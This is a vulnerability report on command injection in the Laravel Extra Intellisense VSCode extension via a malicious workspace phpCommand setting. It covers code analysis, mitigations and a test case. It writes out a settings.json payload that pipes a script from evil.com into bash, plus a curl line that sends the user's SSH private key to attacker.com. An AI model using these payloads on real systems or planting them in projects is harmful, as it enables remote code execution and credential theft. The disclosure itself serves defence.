# Command Injection Vulnerability in Laravel Extra Intellisense

## Vulnerability name
Command Injection via phpCommand Configuration Setting

## Description
The Laravel Extra Intellisense extension executes PHP commands to extract information from Laravel projects for providing autocompletion features. The extension allows users to customize how PHP code is executed through the `LaravelExtraIntellisense.phpCommand` setting. This setting is read from the workspace configuration, which means it can be defined in a project's `.vscode/settings.json` file.

A malicious actor could create a Laravel project with a manipulated `.vscode/settings.json` file containing a crafted `phpCommand` value that injects arbitrary shell commands. When a developer opens this project in VSCode, the extension will execute the malicious commands automatically and repeatedly as it gathers information for autocompletion features.

The attack works as follows:
1. An attacker creates a malicious Laravel project with a `.vscode/settings.json` file
2. The configuration file contains a specially crafted `phpCommand` setting with injected commands
3. A developer opens the project in VSCode with the Laravel Extra Intellisense extension installed
4. The extension reads the malicious `phpCommand` setting from the workspace configuration
5. When the extension executes PHP code for autocompletion, it uses the malicious command template
6. The injected commands execute on the developer's system with their privileges

## Impact
This vulnerability allows arbitrary code execution on the developer's machine. An attacker could:
- Exfiltrate sensitive data (SSH keys, environment variables, credentials)
- Install malware or backdoors
- Access other projects and repositories on the system
- Pivot to other systems on the network

The code execution happens with the full privileges of the VSCode process, giving the attacker broad access to the developer's environment.

## Vulnerability rank
Critical

## Currently implemented mitigations
The extension does implement some escaping mechanisms for the PHP code that gets executed:
- Double quotes are escaped with backslashes
- On Unix-like platforms, dollar signs, single quotes, and double quotes are escaped

However, these mitigations only protect the PHP code parameter and not the command template itself.

The README does include a security note warning users that "This extension runs your Laravel application automatically and periodically," but it doesn't explicitly warn about the risks of opening untrusted projects.

## Missing mitigations
1. The extension should validate the `phpCommand` setting to ensure it matches expected patterns
2. Command sanitization to prevent injection of arbitrary shell commands
3. A prompt or warning when using a non-default `phpCommand` from workspace settings
4. An option to disable workspace-specific `phpCommand` settings in favor of user-level settings

## Preconditions
For this vulnerability to be exploited:
1. A user must have the Laravel Extra Intellisense extension installed in VSCode
2. The user must open a malicious Laravel project containing a crafted `.vscode/settings.json` file
3. The user must allow the extension to execute commands (which happens by default)

## Source code analysis
The vulnerability is in the `runPhp` function in `helpers.ts`:

```typescript
static runPhp(code: string, description: string|null = null) : Promise<string> {
  code = code.replace(/\"/g, "\\\"");
  if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
    code = code.replace(/\$/g, "\\$");
    code = code.replace(/\\\\'/g, '\\\\\\\\\'');
    code = code.replace(/\\\\"/g, '\\\\\\\\\"');
  }
  let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
  let command = commandTemplate.replace("{code}", code);

  // Execute the command with child_process.exec
  cp.exec(command, { cwd: /* project directory */ }, callback);
}
```

The key issues are:

1. The function reads the `phpCommand` setting from workspace configuration without validation
2. The command template can be anything, including malicious shell commands
3. While the PHP code is escaped, the template itself is used as-is
4. The command is executed using `child_process.exec`, which spawns a shell

For example, if an attacker sets the following in `.vscode/settings.json`:

```json
{
  "LaravelExtraIntellisense.phpCommand": "curl https://evil.com/c | bash; php -r \"{code}\""
}
```

When the extension runs PHP code, it will first download and execute a script from evil.com before running the actual PHP code.

The extension runs PHP commands frequently as it watches for file changes and updates autocompletion data, so these malicious commands would be executed repeatedly.

## Security test case
1. Create a new Laravel project with the following file structure:
   ```
   /test-project
     /app
     /bootstrap
     /config
     /...other Laravel files...
     /.vscode/settings.json
   ```

2. In the `.vscode/settings.json` file, add:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "echo 'SECURITY_TEST: Command injection successful' > /tmp/vscode_test; php -r \"{code}\""
   }
   ```

3. Open the project in VSCode with the Laravel Extra Intellisense extension installed

4. Create or open a PHP file in the project and try to trigger autocomplete for a Laravel feature (e.g., type `view('` and wait for autocomplete to appear)

5. Check if the file `/tmp/vscode_test` was created and contains the message "SECURITY_TEST: Command injection successful"

If the file exists with the expected content, the vulnerability is confirmed. This demonstrates that arbitrary commands can be executed through the `phpCommand` setting.

For a more realistic attack, the injected command could be:
```
curl -s https://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64) > /dev/null; php -r "{code}"
```

This would silently exfiltrate the user's SSH private key to the attacker's server.
